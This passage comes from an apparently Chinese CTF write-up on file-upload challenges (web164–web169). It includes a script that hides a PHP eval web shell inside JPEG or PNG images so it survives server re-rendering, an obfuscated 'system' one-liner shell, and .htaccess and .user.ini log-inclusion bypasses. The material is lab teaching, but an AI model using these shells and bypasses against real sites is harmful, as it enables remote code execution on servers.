class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">    $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">&#x27;1.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ÈúÄË¶ÅÂÆâË£ÖphpÁöÑgdÂ∫ìÔºå‰ΩøÁî®ÂëΩ‰ª§<code>sudo apt-get install php-gd</code>ËøõË°åÂÆâË£ÖÔºåÁÑ∂ÂêéËøêË°åÔºåÁîüÊàê1.png<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/MZQ8WG%40%5D1R%7B0O9%5B%25EK%400H%7BC.png" alt=""><br>Êé•ÁùÄ‰∏ä‰º†ÁîüÊàêÁöÑÂõæÁâáÈ©¨ÔºåÁÑ∂ÂêéËÆøÈóÆÂõæÁâáÂú∞ÂùÄÔºåÊäìÂåÖpostÊâßË°åÂëΩ‰ª§Âç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web164/Y2LT_J5_3WXPZZJ%60AHHKMFS.png" alt=""></p><h3 id="web165"><a class="header-anchor" href="#web165">¬∂</a>web165</h3><p>ËøôÊ¨°ÂèòÊàêjpg‰∫ÜÔºåÂú®ÁΩë‰∏äÊâæ‰∫ÜÂØπÂ∫îÁöÑ‰∫åÊ¨°Ê∏≤ÊüìÁöÑËÑöÊú¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">	It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">	2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">	jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">	1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">	2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	See also:</span></span><br><span class="line"><span class="comment">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	$miniPayload = <span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">		$outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		$extraBytes = <span class="number">0</span>;</span><br><span class="line">		$correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			<span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp = </span><br><span class="line">					substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">					$miniPayload . </span><br><span class="line">					str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">				<span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">						<span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream = </span><br><span class="line">						substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">						$miniPayload . </span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		<span class="keyword">if</span>($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		<span class="keyword">return</span> $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">				$extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $binData;</span><br><span class="line">		<span class="keyword">private</span> $order;</span><br><span class="line">		<span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">			<span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>‰∏çËøájpgÂõæÁâáÊàêÂäüÁéáÂæà‰ΩéÔºåËØï‰∫ÜÂ•ΩÂ§öÂº†ÈÉΩ‰∏çË°åÔºåÊêú‰∫Ü‰∏Ä‰∏ãÔºåÂèë‰∏ãÂõΩÂÖâÂ∏àÂÇÖÂàÜ‰∫´‰∫Ü‰∏ÄÂº†ÊàêÂäüÁéáÊØîËæÉÈ´òÁöÑÂõæÁâáÔºå‰∏ãÈù¢ÊòØÂéüÂõæ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/jpg%E6%B8%B2%E6%9F%93.jpg" alt=""><br>ÂÖàÂú®ÁΩëÈ°µ‰∏ä‰º†ËøôÂº†ÂõæÁâá<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/DTQ%7BJY%40B9%5B%7B%5DPGM2~T%4092D2.png" alt=""><br>ÁÑ∂ÂêéÁÇπÂáªÊü•ÁúãÂõæÁâáÔºåcrtl+s‰∏ãËΩΩË¢´Ê∏≤ÊüìËøáÁöÑÂõæÁâáÔºåÂè¶Â≠ò‰∏∫1.jpg<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/7Y%5DK4ETOOTZ%60%25A5%5DX90U9N3.png" alt=""><br>ÁÑ∂ÂêéËøêË°åËÑöÊú¨ÔºåÁîüÊàêpayload_1.jpg<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/XDCB%29B%241QOV%5BKIV%60%7DKY%24A%7DV.png" alt=""><br>ÁÑ∂ÂêéÂÜç‰∏ä‰º†payload_1.jpgÔºåÁÇπÂáªÊü•ÁúãÂõæÁâáÔºåÂèØ‰ª•ÁúãÂà∞ÂõæÁâáÊúâÊòéÊòæÂèòÂåñ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/J%28W%28%5DV3V%24%29A50Z%40ECI%40Y%25W0.png" alt=""><br>ÁÑ∂ÂêéÊäìÂåÖÔºåÊâßË°åÂëΩ‰ª§Ëé∑Âèñflag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/Q27%28%245SI%256F%5B%28_~B8%40%5B%7D%7B0C.png" alt=""></p><h3 id="web166"><a class="header-anchor" href="#web166">¬∂</a>web166</h3><p>Êü•ÁúãÊ∫êÁ†ÅÔºåÂèëÁé∞Âè™ËÉΩ‰∏ä‰º†zip<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166/YT%5DSW%7DTXIA%5B%29%5D1MVO%24UZKGJ.png" alt=""><br>Êàë‰ª¨ÂÜô‰∏™‰∏ÄÂè•ËØùÊú®È©¨ÔºåÁÑ∂ÂêéÊääphpÊîπÊàêzip‰∏ä‰º†<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166/AZ3QVAW82G%5BXF8JXL%5D%257_XP.png" alt=""><br>ÁÑ∂ÂêéËÆøÈóÆ‰∏ä‰º†ÁöÑÈ°µÈù¢ÔºåÈÄöËøáÊñá‰ª∂ÂåÖÂê´ÁöÑÁâπÊÄßÔºåÊàë‰ª¨Áõ¥Êé•ÊâßË°åÂëΩ‰ª§Âç≥ÂèØ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166/%408FNPO90%5DJXB%29XEAAXTS%5BBO.png" alt=""></p><h3 id="web167"><a class="header-anchor" href="#web167">¬∂</a>web167</h3><p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÁöÑhttpdÔºåÊÉ≥Âà∞ÊòØÂà©Áî®htaccessÊñá‰ª∂</p><blockquote><p>htaccessÊñá‰ª∂ÊòØApacheÊúçÂä°Âô®‰∏≠ÁöÑ‰∏Ä‰∏™ÈÖçÁΩÆÊñá‰ª∂ÔºåÂÆÉË¥üË¥£Áõ∏ÂÖ≥ÁõÆÂΩï‰∏ãÁöÑÁΩëÈ°µÈÖçÁΩÆ„ÄÇÈÄöËøáhtaccessÊñá‰ª∂ÔºåÂèØ‰ª•Â∏ÆÊàë‰ª¨ÂÆûÁé∞ÔºöÁΩëÈ°µ301ÈáçÂÆöÂêë„ÄÅËá™ÂÆö‰πâ404ÈîôËØØÈ°µÈù¢„ÄÅÊîπÂèòÊñá‰ª∂Êâ©Â±ïÂêç„ÄÅÂÖÅËÆ∏/ÈòªÊ≠¢ÁâπÂÆöÁöÑÁî®Êà∑ÊàñËÄÖÁõÆÂΩïÁöÑËÆøÈóÆ„ÄÅÁ¶ÅÊ≠¢ÁõÆÂΩïÂàóË°®„ÄÅÈÖçÁΩÆÈªòËÆ§ÊñáÊ°£Á≠âÂäüËÉΩ</p></blockquote><p>È¶ñÂÖà‰∏ä‰º†‰∏Ä‰∏™jpgÊñá‰ª∂ÊäìÂåÖ(Âõ†‰∏∫ÂâçÊÆµÈôêÂà∂‰∫ÜÂè™ËÉΩ‰∏ä‰º†jpg)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊñá‰ª∂ÂêçÊîπÊàê<code>.htaccess</code>ÔºåÁÑ∂Âêé‰∏ä‰º†<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167/YTG%245E9COT_ZJJ33WN%400NP3.png" alt=""><br>Êé•ÁùÄÂÜç‰∏ä‰º†jpgÊ†ºÂºèÊñá‰ª∂ÔºåÂÜÖÂÆπÊòØ‰∏ÄÂè•ËØùÊú®È©¨<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167/FRDI%5D%40KD%5DFE_70F56%24_3YXY.png" alt=""><br>ÁÑ∂ÂêéËÆøÈóÆÊñá‰ª∂ÔºåÊâßË°åÂëΩ‰ª§Âç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167/ED6%5B%7DX6BJ_NY5%5BSGJFSV1%60V.png" alt=""></p><h3 id="web168"><a class="header-anchor" href="#web168">¬∂</a>web168</h3><p>Ê†πÊçÆÈ¢òÁõÆÊèêÁ§∫ÔºåÊòØË¶ÅÂÅöÁÆÄÂçïÁöÑÂÖçÊùÄÔºåÂàöÂ•ΩÁé©awdÈÅáËøáÊå∫Â§öÂÖçÊùÄÈ©¨ÔºåÁ¨¨‰∏Ä‰∏™ÂÖàÁ•≠‰∏äbugkuÁöÑ‰∏ÄÈÅìÈ¢òËøáÁãó‰∏ÄÂè•ËØùÁöÑÂÖçÊùÄÈ©¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $poc=<span class="string">&quot;s#y#s#t#e#m&quot;</span>; </span><br><span class="line">    $poc_1=explode(<span class="string">&quot;#&quot;</span>,$poc); </span><br><span class="line">    $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>];</span><br><span class="line">    $poc_2($_REQUEST[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ËøòÊòØÂü∫Á°ÄÊìç‰ΩúÔºåÂÅö‰∏Ä‰∏™ÂõæÁâáÈ©¨‰º†‰∏äÂéª<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168/S%24Z%2486L0389ST1%29RK~B_808.png" alt=""><br>ÂèØ‰ª•ÁúãËßÅÊàêÂäü‰∏ä‰º†ÔºåÁªïÂêéËÆøÈóÆuploadÁõÆÂΩïÊâßË°åÂëΩ‰ª§Ëé∑Âèñflag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168/3%25Z%28%7D629S4%245LEC2AM%7B%40E%405.png" alt=""></p><h3 id="web169"><a class="header-anchor" href="#web169">¬∂</a>web169</h3><p>Âè≥ÈîÆÊ∫êÁ†ÅÊü•ÁúãÂâçÁ´ØÈôêÂà∂Âè™ËÉΩ‰∏ä‰º†zipÔºåÂÖà‰∏ä‰º†‰∏Ä‰∏™zipÔºåÁÑ∂ÂêéÊäìÂåÖÔºåÊîπ<code>Content-Type</code>‰∏∫<code>image/png</code>ÔºåÂèØ‰ª•‰º†phpÁ≠âÊ†ºÂºèÔºå‰ΩÜÂèëÁé∞ÂÜÖÂÆπ‰∏≠ËøáÊª§‰∫Ü<code>&lt;&gt;</code>Âíå<code>php</code>ÔºåËØï‰∫Ü‰∏ãÂèØ‰ª•‰º†<code>.user.ini</code>ÔºåÊàë‰ª¨Â∞ùËØï‰∏Ä‰∏ãÊó•ÂøóÂåÖÂê´Ôºå<code>User-Agent</code>Âä†‰∏ä‰∏ÄÂè•ËØùÊú®È©¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169/X%24%608AQ%28Z4%25Z8U%604%60P0FFHF9.png" 